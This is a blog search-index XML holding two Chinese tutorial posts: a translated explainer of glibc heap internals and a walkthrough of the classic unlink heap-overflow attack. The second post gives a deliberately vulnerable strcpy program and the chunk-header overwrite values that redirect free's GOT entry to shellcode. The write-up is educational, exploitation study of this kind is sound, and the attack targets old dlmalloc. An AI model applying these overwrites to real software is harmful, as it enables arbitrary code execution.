<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Heap I</title>
    <url>/xiaohong404.github.io/2020/10/16/Heap/Heap-I/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/0.png" class></strong></p>
 <a id="more"></a>

<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">原版传送门</a></p>
<h3 id="WHAT-IS-THE-HEAP-AND-WHY-DO-PEOPLE-USE-IT"><a href="#WHAT-IS-THE-HEAP-AND-WHY-DO-PEOPLE-USE-IT" class="headerlink" title="WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?"></a><strong>WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?</strong></h3><p>堆是C/C++程序员在程序执行期间手动分配的新的区域。程序员通过调用堆相关的函数如<em>malloc</em>向堆管理器请求这部分区域。这些被分配的内存区域，或者称为“allocations”，之后可以被程序员一直使用、修改或者引用，直到他们不再需要这部分区域，会调用free函数将这部分区域返还给堆管理器。</p>
<p>下面是一个C语言程序分配、使用并且释放堆上的结构体的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125; SomeStruct;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeStruct* myObject = (SomeStruct*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SomeStruct));</span><br><span class="line">    <span class="keyword">if</span>(myObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">        myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">        do_stuff(myObject);</span><br><span class="line">	<span class="built_in">free</span>(myObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只要程序员遵循下面几个小的规则，堆管理器将确保每个已分配的堆不会相互重叠。这个特点使得堆非常有用并且高效，这和大多数C/C++程序追求性能的要求相符合。</p>
<p>接下来的图表列出了一些程序员在使用堆时的基本规则，以及在程序员违反这些规则时发生的一些漏洞类别。之后，我将更详细地讨论所有这些与堆相关的漏洞类别，目前只讨论堆使用正确时的表现。</p>
<h3 id="HEAP-RULES"><a href="#HEAP-RULES" class="headerlink" title="HEAP RULES"></a>HEAP RULES</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/1.png" class></strong></p>
<p>当然，<em>malloc</em>和<em>free</em>并不是C和C++程序员与堆进行交互的唯一方式。相反，C++开发人员通常通过C++运算符new和new []分配内存。必须使用相应的C++运算符delete和delete []而不是<em>free</em>释放这些分配。程序员还可以通过与malloc兼容的堆函数（例如<a href="http://man7.org/linux/man-pages/man3/calloc.3p.html"><em>calloc</em></a>，<a href="http://man7.org/linux/man-pages/man3/realloc.3p.html"><em>realloc</em></a>和<a href="https://linux.die.net/man/3/memalign"><em>memalign）</em></a>来分配内存，这些函数最终也通过<em>free</em>释放，就像<em>malloc</em>一样。</p>
<p>为简单起见，将首先讨论<em>malloc</em>和<em>free</em>，下面是一个C++程序如何分配，使用和释放堆上的结构体的例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeClass* myObject = <span class="keyword">new</span> SomeClass();</span><br><span class="line">    myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">    myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">    do_stuff(myObject);</span><br><span class="line">    <span class="keyword">delete</span> myObject;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="MEMORY-CHUNKS-AND-THE-CHUNK-ALLOCATION-STRATEGIES"><a href="#MEMORY-CHUNKS-AND-THE-CHUNK-ALLOCATION-STRATEGIES" class="headerlink" title="MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES"></a><strong>MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES</strong></h3><p>假设一个程序员通过malloc需求10字节内存，为了满足这个请求，堆管理器不仅仅只随机寻找一个10字节的程序员可以写的区域，而是需要做更多的事情。堆管理器也需要存储此次分配的元数据。这个元数据被存储在紧邻分配的10字节区域处。</p>
<p>堆管理器还需要确保分配空间在32位系统上是8字节对齐的，在64位系统上是16字节对齐的。如果程序员只想存储文本字符串或字节数组之类的数据，那么分配空间的对齐方式无关紧要。但是如果程序员打算使用分配空间来存储更多复杂的数据结构，则对齐方式会对程序的正确性和性能会产生重大影响。由于<em>malloc</em>无法知道程序员将在分配空间中存储什么内容，因此堆管理器必须默认确保所有分配空间均对齐。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/2.png" class></strong></p>
<p>此分配元数据和对齐填充字节与<em>malloc</em>的内存区域将一起被存储并返回给程序员。因此，堆管理器在内部分配的“块”内存比程序员最初要求的稍大。当程序员要求10个字节的内存时，堆管理器会找到或创建一个新的内存块，该块足以存储10个字节的空间、元数据以及对齐填充字节。然后，堆管理器将此块标记为“已分配”，并返回指向块内对齐的10字节“用户数据”区域的指针，程序员将收到<em>malloc</em>调用的返回值。</p>
<h3 id="CHUNK-ALLOCATION-BASIC-STRATEGY"><a href="#CHUNK-ALLOCATION-BASIC-STRATEGY" class="headerlink" title="CHUNK ALLOCATION: BASIC STRATEGY"></a><strong>CHUNK ALLOCATION: BASIC STRATEGY</strong></h3><p>那么堆管理器如何在内部分配这些块呢？</p>
<p>首先，让我们看一下堆管理器的大部分工作，分配小块内存的（大大简化的）策略。我将在详细地解释每个步骤，之后我们就可以研究分配大块内存的特殊情况。</p>
<p>简化的小块分配策略如下：</p>
<ol>
<li><p>如果有一个先前释放的内存块，并且该块足够大，可以满足用户的请求，则堆管理器将使用这个释放的块进行新的分配。</p>
</li>
<li><p>否则，如果堆顶部有可用空间，则堆管理器将从这个空闲的空间中分配一个新的块并使用它。</p>
</li>
<li><p>否则，堆管理器将要求内核向堆的末尾添加新的内存，并且从新分配的空间中分配一个新块给用户。</p>
</li>
<li><p>如果前面所有策略均失败，则无法为提供分配服务，并且<em>malloc</em>返回NULL。</p>
</li>
</ol>
<h4 id="ALLOCATING-FROM-FREE’D-CHUNKS"><a href="#ALLOCATING-FROM-FREE’D-CHUNKS" class="headerlink" title="ALLOCATING FROM FREE’D CHUNKS"></a><strong>ALLOCATING FROM FREE’D CHUNKS</strong></h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/3.png" class></strong></p>
<p>从概念上讲，分配之前释放的块非常简单。因为当一个块在内存中被释放，堆管理器会在一系列称为<em>“bins”</em>的不同链表中记录这些释放的块。用户发出一个分配请求后，堆管理器会在这些<em>“bins”</em>中搜索一个足够大的空闲块，为用户提供服务。如果可以成功找到一个，则将这个空闲块从特定的bin中删除，并标记为“已分配”，然后这个指向该“user data”区域块的指针，会作为<em>malloc</em>的返回值返回给程序员。</p>
<p>出于性能原因，有几种不同类型的<em>bins</em>，即<em>fast bins 、unsorted bins 、small bins、large bins 、per-thread tcache</em>。下个部分将详细讨论这些不同种类的<em>bins</em>。</p>
<h4 id="ALLOCATING-FROM-THE-TOP-OF-THE-HEAP"><a href="#ALLOCATING-FROM-THE-TOP-OF-THE-HEAP" class="headerlink" title="ALLOCATING FROM THE TOP OF THE HEAP"></a><strong>ALLOCATING FROM THE TOP OF THE HEAP</strong></h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/4.gif" class></strong></p>
<p>如果没有可用的空闲块可以满足分配请求，则堆管理器必须从头开始构造一个新块。为此，堆管理器首先查看堆顶部是否有足够的可用空间（有时称为“top chunk”或“remainder chunk”）。如果存在，堆管理器将在此可用空间基础上构造一个新块。</p>
<h4 id="ASKING-THE-KERNEL-FOR-MORE-MEMORY-AT-THE-TOP-OF-THE-HEAP"><a href="#ASKING-THE-KERNEL-FOR-MORE-MEMORY-AT-THE-TOP-OF-THE-HEAP" class="headerlink" title="ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP"></a><strong>ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP</strong></h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/5.gif" class></strong></p>
<p>一旦堆顶部的可用空间用完，堆管理器将不得不要求内核在堆的末尾增加更多内存。</p>
<p>在建立堆的开始阶段上，堆管理器通过调用<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html"><em>sbrk</em></a>，要求内核在堆末尾分配更多的内存。在大多数基于Linux的系统上，在内部使用称为“ <a href="https://linux.die.net/man/2/brk">brk</a> ”的系统调用。这个系统调用的名称很容易混淆，它最初的意思是“更改程序中断位置”，通俗来说，它表示在程序加载到内存之后，该区域会增加更多的内存。因为这是堆管理器从一开始创建堆的地方，所以此系统调用的作用是在程序堆的末尾分配更多的内存。</p>
<p>最终，如果一直使用<em>sbrk</em>扩展堆会导致分配失败，因为堆空间增长得太大之后，进一步扩展将导致其与进程地址空间中的其他内容发生冲突，例如内存映射，共享库或线程的堆栈区域。因此sbrk无法分配时，堆管理器将使用<a href="http://man7.org/linux/man-pages/man2/mmap.2.html"><em>mmap</em></a>调用将新的非连续内存<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l2320">附加</a>到初始程序堆。</p>
<p>如果<em>mmap</em>也失败，则该进程根本无法分配更多的内存，并且<em>malloc</em>将返回NULL。</p>
<h3 id="OFF-HEAP-ALLOCATIONS-VIA-MMAP"><a href="#OFF-HEAP-ALLOCATIONS-VIA-MMAP" class="headerlink" title="OFF-HEAP ALLOCATIONS VIA MMAP"></a><strong>OFF-HEAP ALLOCATIONS VIA MMAP</strong></h3><p>很大的分配请求（超过某个阈值*）在堆管理器中会得到<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l866">特殊处理</a>。通过直接调用<em>mmap</em>可以在堆外分配这些大块，并使用块中元数据的标记位来标记这一事实。当这些巨大块通过调用<em>free</em>释放到堆管理器时，堆管理器将通过<em>munmap</em>将整个<em>mmap</em> 过的区域返还给系统。</p>
<p>*默认情况下，此<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l858">阈值</a> 在32位系统上为128KB~512KB，在64位系统上为32MB，但是，如果堆管理器检测到这些分配的大块内存只需要被临时使用，则此阈值也会<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l949">动态增加</a>。</p>
<h3 id="ARENAS"><a href="#ARENAS" class="headerlink" title="ARENAS"></a><strong>ARENAS</strong></h3><p>在多线程应用程序上，堆管理器需要保护内部堆数据结构免受可能导致程序崩溃的竞争条件的影响。在<em>ptmalloc2</em>之前，堆管理器通过在每次堆操作之前简单地使用全局互斥锁，以确保在任何给定时间只有一个线程可以与堆进行交互。</p>
<p>尽管此策略有效，但堆分配器对高利用率和性能非常敏感，以至于导致使用大量线程的应用程序出现严重的性能问题。为了解决这个问题，<em>ptmalloc2</em>堆分配器引入了<em>“arenas”</em>的概念。每个<em>“arenas”</em>本质上是一个完全不同的堆，它完全独立地管理自己的块分配和<em>free bins</em>。每个<em>“arenas”</em>仍然使用互斥锁来序列化不同线程对内部数据结构的访问，但是只要线程与不同的<em>“arenas”</em>进行交互，线程就可以安全地执行堆操作而不会彼此停顿。</p>
<p>程序的初始（“main”）<em>“arenas”</em>仅包含我们已经看到的堆，对于单线程应用程序，这是堆管理器将使用的唯一<em>arena</em>。但是，随着新线程加入该进程，堆管理器会为每个新线程分配并附加<em>“arenas”</em>，以减少<em>malloc</em>和<em>free</em>等操作的等待时间。</p>
<p>对于每个加入该进程的新线程，堆管理器将先查找没有被其他线程在使用的<em>“arenas”</em>，并将该<em>“arenas”</em>附加到该线程。一旦所有可用的<em>“arenas”</em>都是在其它线程使用中，堆管理器将<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l872">创建一个新的</a><em>“arenas”</em>，直到<em>“arenas”</em>的数目达到最大（32位进程为CPU核心数的2倍、64位进程位CPU核心的8倍）。一旦最终达到该限制，堆管理器就会放弃分配，这样多个线程将必须共享一个<em>“arenas”</em>，即执行堆操作将需要那些线程中的一个等待另一个线程。</p>
<p>但是这些二级<em>“arenas”</em>如何工作？我们看到，主堆在程序加载到内存的紧邻其后的位置，并使用<em>brk</em>系统调用对其进行扩展开始工作，但二级<em>“arenas”</em>并不相同，这些二级<em>“arenas”</em>使用<em>mmap</em>和<em>mprotect</em>创建的一个或多个“<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">子堆</a>”来模拟主堆的行为。</p>
<h3 id="SUBHEAPS"><a href="#SUBHEAPS" class="headerlink" title="SUBHEAPS"></a><strong>SUBHEAPS</strong></h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/6.png" class></strong></p>
<p>子堆的工作方式与初始程序堆基本相同，主要存在两个区别。初始堆位于程序加载到内存之后的紧邻其后的位置，并且由<em>sbrk</em>动态扩展。相比之下，每个子堆使用<em>mmap</em>定位到内存中，堆管理器使用<em>mprotect</em>手动模拟增长子堆。</p>
<p>当堆管理器想要创建子堆时，它首先通过调用<em>mmap</em>要求内核保留该子堆可能增长到的内存区域<em>。</em>保留该区域不会将内存直接分配到子堆中；它只是要求内核不要在该区域内分配诸如线程堆栈，mmap区域或者其它的分配任务。*默认情况下，子堆大小最大（即保留该子堆使用的内存区域）在32位上为1MB，在64位系统上为64MB。</p>
<p>这是通过<em>mmap</em>询问标记为<em>PROT_NONE</em>的页面来完成的，这表明内核仅需要为该区域保留地址范围，不需要内核将内存直接分配给它。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/7.png" class></strong></p>
<p>在使用<em>sbrk</em>增长初始堆的地方，堆管理器通过手动调用<a href="http://man7.org/linux/man-pages/man2/mprotect.2.html"><em>mprotect</em></a>将区域中的页面从<em>PROT_NONE</em>更改为<em>PROT_READ | PROT_WRITE</em>来将子堆“增长”到此保留的地址范围。这导致内核将物理内存附加到那些地址，实际上也会导致子堆缓慢增长，直到整个<em>mmap</em>区域已满。一旦整个子堆都用完，<em>arenas</em>便会分配另一个子堆。这将允许二级<em>”arenas”</em>几乎无限期地保持增长，直到内核耗尽内存或进程耗尽地址空间时才会失败。</p>
<h4 id="Recap："><a href="#Recap：" class="headerlink" title="Recap："></a>Recap：</h4><p>初始（“main”）<em>arena</em>仅包含主堆，该主堆位于将程序二进制文件加载到内存之后的位置，并使用<em>sbrk</em>进行扩展。这是用于单线程应用程序的唯一<em>arena</em>。在多线程应用程序上，为新线程分配了二级<em>arena</em>，从中可以分配这些二级<em>arena</em>。使用<em>arenas</em>可以降低线程在执行堆操作之前需要等待互斥锁的可能性，从而提高了程序的速度。与<em>main arena</em>不同，这些二级<em>arena</em>从一个或多个子堆中分配块，这些子堆在内存中的位置首先使用<em>mmap</em>进行确定，并通过使用<em>mprotect</em>进行扩展。</p>
<h3 id="CHUNK-METADATA"><a href="#CHUNK-METADATA" class="headerlink" title="CHUNK METADATA"></a><strong>CHUNK METADATA</strong></h3><p>现在，了解了分配块的所有不同方式，这些块不仅包含提供给程序员的“用户数据”区域（作为<em>malloc</em>的返回值），同时包含元数据。下面介绍元数据实际记录的值以及存放的位置。</p>
<p>块的元数据在内存中的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1038">确切布局</a>可能会很混乱，因为堆管理器源代码将一个块末尾的元数据与下一个块末尾的元数据组合在一起，并且几个存在并被使用的元数据字段取决于不同种类的chunk。</p>
<p>现在，我们仅看一下实时分配，它具有单个<em>size_t</em> * 标头，该标头位于给程序员的“用户数据”区域的后面。此字段（在源代码中称为<em>mchunk_size</em>）是在<em>malloc</em>期间写入的，之后由<em>free</em>决定如何处理该分配空间的释放。</p>
<p>* size_t值在32位系统上为4字节整数，在64位系统上为8字节整数。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/8.png" class></strong></p>
<p>该<em>mchunk_size</em>存储了四种信息：块的大小，以及被称为“A”,“M”和“P”三比特位。这些都被存储在相同的<em>size_t</em>字段中，因为块大小始终是8字节对齐的（在64位上是16字节对齐），因此，块大小的低三位始终为零。</p>
<p><strong>“ A ”标志</strong>是用来告诉堆管理器，是否该块属于二级<em>arena</em>，而不是在<em>main arena</em>。在free期间，堆管理器仅仅给了一个指向程序员想要释放空间的指针，并且堆管理器需要确定该指针属于哪一个<em>arena</em>。如果在块的元数据中A标志被设置，则堆管理器必须搜索每个<em>arena</em>，并查看指针是否位于该<em>arena</em>的任何子堆中。如果未设置该标志，则堆管理器可以减少搜索，因为它知道该块来自初始的<em>arena</em>。</p>
<p><strong>“ M ”标志</strong>用于指示该块是一个通过<em>mmap</em>进行堆外分配的巨大分配。当此分配空间最终返回给<em>free时</em>，堆管理器将通过<em>munmap</em>立即将整个块返回给操作系统，而不是尝试对其进行回收。因此，空闲即已经被释放的块永远不会设置该标志位。</p>
<p><strong>“ P ”标志</strong>令人困惑，因为它实际上属于先前的块。它指示先前的块是一个空闲块。这意味着当这个块被释放时，可以将其安全地连接到先前的块上，以创建更大的空闲块。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/9.gif" class></strong></p>
<p>下面是一些和堆相关的文章：</p>
<ul>
<li><a href="http://phrack.org/issues/57/9.html">Once upon a free()</a></li>
<li><a href="http://phrack.org/issues/66/10.html">Malloc des-maleficarum</a></li>
<li><a href="http://phrack.org/issues/67/8.html">The house of lore</a></li>
<li><a href="http://phrack.org/issues/61/6.html">Advanced Doug Lea’s malloc exploits</a></li>
<li><a href="http://phrack.org/issues/66/6.html">Yet another free() exploitation technique</a></li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Heap</category>
        <category>Heap_Basic</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink漏洞攻击</title>
    <url>/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
 <a id="more"></a>

<h2 id="从一段代码开始"><a href="#从一段代码开始" class="headerlink" title="从一段代码开始"></a>从一段代码开始</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" class></strong></p>
<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
<h2 id="什么是unlink"><a href="#什么是unlink" class="headerlink" title="什么是unlink"></a>什么是unlink</h2><p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
<h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
<p>malloc.c 中向后合并的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>

<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
<h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
<p>malloc.c 中向前合并的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>

<p>本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></span><br><span class="line">  FD = P-&gt;fd;             \</span><br><span class="line">  BK = P-&gt;bk;             \</span><br><span class="line">  FD-&gt;bk = BK;            \</span><br><span class="line">  BK-&gt;fd = FD;            \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unlink 即为将 P 从链表中删除的过程。</p>
<h2 id="unlink攻击"><a href="#unlink攻击" class="headerlink" title="unlink攻击"></a>unlink攻击</h2><p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
<h3 id="原始的-unlink-攻击"><a href="#原始的-unlink-攻击" class="headerlink" title="原始的 unlink 攻击"></a>原始的 unlink 攻击</h3><p>述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prev_size = 偶数</span><br><span class="line">size = <span class="number">-4</span></span><br><span class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></span><br><span class="line">bk = shellcode address</span><br></pre></td></tr></table></figure>

<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span></span><br><span class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address</span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *((<span class="built_in">free</span>@got–<span class="number">12</span>)-&gt;bk) = shellcode address</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = <span class="built_in">free</span>@got – <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/2.png" class></strong></p>
